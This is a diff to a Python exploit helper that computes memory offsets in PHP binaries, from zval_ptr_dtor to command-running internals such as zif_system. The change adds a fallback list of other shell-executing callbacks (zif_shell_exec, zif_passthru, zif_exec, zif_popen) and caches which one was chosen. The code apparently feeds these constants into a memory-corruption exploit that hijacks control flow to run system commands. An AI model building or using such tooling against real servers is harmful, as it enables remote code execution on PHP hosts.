@@ -481,16 +481,29 @@ def compute_offsets(symbols: dict[str, int]) -> dict:
     result["DTOR_LOW21"] = dtor & CHUNK_MASK
     result["zval_ptr_dtor"] = dtor
 
-    zif = symbols.get("zif_system")
+    # Prefer zif_system, fall back to alternatives that also run commands
+    CALLBACK_PREFERENCE = [
+        "zif_system", "zif_shell_exec", "zif_passthru", "zif_exec", "zif_popen",
+    ]
+    chosen_name = None
+    zif = None
+    for name in CALLBACK_PREFERENCE:
+        if name in symbols:
+            chosen_name = name
+            zif = symbols[name]
+            break
+
     if zif is None:
-        result["error"] = "zif_system not found — cannot compute ZIF_SYSTEM_FROM_DTOR"
+        result["error"] = ("no usable callback found (tried: "
+                           + ", ".join(CALLBACK_PREFERENCE) + ")")
         return result
 
-    result["zif_system"] = zif
+    result["callback"] = chosen_name
+    result["callback_addr"] = zif
     result["ZIF_SYSTEM_FROM_DTOR"] = zif - dtor
 
     alts = {}
-    for name in ("zif_exec", "zif_passthru", "zif_shell_exec", "zif_popen"):
+    for name in CALLBACK_PREFERENCE:
         if name in symbols:
             alts[name] = symbols[name] - dtor
     result["alternatives"] = alts
@@ -1009,20 +1022,22 @@ def _cache_key(image: str, platform: str | None, php_path: str | None) -> str:
 
 
 def _cache_load(image: str, platform: str | None,
-                php_path: str | None) -> tuple[int, int, str] | None:
-    """Return cached (DTOR_LOW21, ZIF_SYSTEM_FROM_DTOR, php_version) or None."""
+                php_path: str | None) -> tuple[int, int, str, str] | None:
+    """Return cached (DTOR_LOW21, ZIF_SYSTEM_FROM_DTOR, php_version, callback) or None."""
     path = CACHE_DIR / f"{_cache_key(image, platform, php_path)}.json"
     if not path.is_file():
         return None
     try:
         data = json.loads(path.read_text())
-        return data["DTOR_LOW21"], data["ZIF_SYSTEM_FROM_DTOR"], data["php_version"]
+        return (data["DTOR_LOW21"], data["ZIF_SYSTEM_FROM_DTOR"],
+                data["php_version"], data.get("callback", "zif_system"))
     except (KeyError, json.JSONDecodeError, OSError):
         return None
 
 
 def _cache_save(image: str, platform: str | None, php_path: str | None,
-                dtor_low21: int, zif_from_dtor: int, php_version: str) -> None:
+                dtor_low21: int, zif_from_dtor: int, php_version: str,
+                callback: str) -> None:
     """Persist calculator results for reuse."""
     CACHE_DIR.mkdir(parents=True, exist_ok=True)
     path = CACHE_DIR / f"{_cache_key(image, platform, php_path)}.json"
@@ -1033,14 +1048,15 @@ def _cache_save(image: str, platform: str | None, php_path: str | None,
         "DTOR_LOW21": dtor_low21,
         "ZIF_SYSTEM_FROM_DTOR": zif_from_dtor,
         "php_version": php_version,
+        "callback": callback,
     }, indent=2) + "\n")
 
 
 def calculate_offsets(image: str,
                       platform: str | None = None,
                       php_path: str | None = None,
-                      recalculate: bool = False) -> tuple[int, int, str]:
-    """Return (DTOR_LOW21, ZIF_SYSTEM_FROM_DTOR, php_version_string)."""
+                      recalculate: bool = False) -> tuple[int, int, str, str]:
+    """Return (DTOR_LOW21, ZIF_SYSTEM_FROM_DTOR, php_version, callback_name)."""
 
     if not recalculate:
         cached = _cache_load(image, platform, php_path)
@@ -1088,7 +1104,11 @@ def calculate_offsets(image: str,
     if "error" in offsets:
         raise RuntimeError(f"offset calculation failed: {offsets['error']}")
 
-    result = (offsets["DTOR_LOW21"], offsets["ZIF_SYSTEM_FROM_DTOR"], php_version)
+    callback = offsets["callback"]
+    if callback != "zif_system":
+        print(f"[calc] zif_system not found, using {callback}", flush=True)
+    result = (offsets["DTOR_LOW21"], offsets["ZIF_SYSTEM_FROM_DTOR"],
+              php_version, callback)
     _cache_save(image, platform, php_path, *result)
     print(f"[calc] cached to {CACHE_DIR}/", flush=True)
     return result
@@ -1096,14 +1116,13 @@ def calculate_offsets(image: str,
 
 def calculate_offsets_from_binary(
         binary_path: str,
-        recalculate: bool = False) -> tuple[int, int, str]:
-    """Return (DTOR_LOW21, ZIF_SYSTEM_FROM_DTOR, php_version_string)
+        recalculate: bool = False) -> tuple[int, int, str, str]:
+    """Return (DTOR_LOW21, ZIF_SYSTEM_FROM_DTOR, php_version, callback_name)
     by analysing a local PHP binary directly (no Docker needed)."""
     binary = Path(binary_path).resolve()
     if not binary.is_file():
         raise RuntimeError(f"Binary not found: {binary}")
 
-    cache_key = _cache_key(f"local_{binary.name}", None, None)
     if not recalculate:
         cached = _cache_load(f"local_{binary.name}", None, None)
         if cached is not None:
@@ -1123,7 +1142,11 @@ def calculate_offsets_from_binary(
     if "error" in offsets:
         raise RuntimeError(f"offset calculation failed: {offsets['error']}")
 
-    result = (offsets["DTOR_LOW21"], offsets["ZIF_SYSTEM_FROM_DTOR"], php_version)
+    callback = offsets["callback"]
+    if callback != "zif_system":
+        print(f"[calc] zif_system not found, using {callback}", flush=True)
+    result = (offsets["DTOR_LOW21"], offsets["ZIF_SYSTEM_FROM_DTOR"],
+              php_version, callback)
     _cache_save(f"local_{binary.name}", None, None, *result)
     print(f"[calc] cached to {CACHE_DIR}/", flush=True)
     return result
@@ -1373,17 +1396,19 @@ def main() -> int:
     # ── Calculate code offsets ───────────────────────────────────────────
     try:
         if args.binary:
-            dtor_low21, zif_from_dtor, php_version = \
+            dtor_low21, zif_from_dtor, php_version, callback = \
                 calculate_offsets_from_binary(args.binary, args.recalculate)
         else:
-            dtor_low21, zif_from_dtor, php_version = calculate_offsets(
-                args.image, args.platform, args.php_path, args.recalculate)
+            dtor_low21, zif_from_dtor, php_version, callback = \
+                calculate_offsets(
+                    args.image, args.platform, args.php_path, args.recalculate)
     except RuntimeError as exc:
         print(f"[abort] {exc}", file=sys.stderr, flush=True)
         return 1
 
     print(f"[calc] DTOR_LOW21           = {format_hex(dtor_low21)}", flush=True)
     print(f"[calc] ZIF_SYSTEM_FROM_DTOR = {format_hex(zif_from_dtor)}", flush=True)
+    print(f"[calc] CALLBACK             = {callback}", flush=True)
     print(f"[calc] PHP_VERSION          = PHP/{php_version}", flush=True)
 
     # ── Apply all constants ──────────────────────────────────────────────
